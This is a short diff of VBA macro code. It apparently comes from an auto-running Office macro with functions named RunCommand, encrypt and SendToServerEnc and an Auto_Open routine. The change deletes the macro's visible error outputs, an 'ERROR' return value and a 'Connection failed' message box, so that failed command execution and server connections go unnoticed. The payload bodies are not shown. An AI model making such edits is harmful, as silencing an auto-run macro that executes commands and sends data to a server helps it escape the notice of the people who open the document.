@@ -13,7 +13,7 @@ Function RunCommand(Command As String) As String
 Done:
         Exit Function
 error:
-        RunCommand = "ERROR"
+ 
 End Function
 Public Function encrypt(s As String, v As Long) As String
     Dim total As String
@@ -46,7 +46,7 @@ Function SendToServerEnc(data As String)
 Done:
     Exit Function
 error:
-        MsgBox ("Connection failed")
+        
 End Function
 Sub Auto_Open()
     Dim newString As String
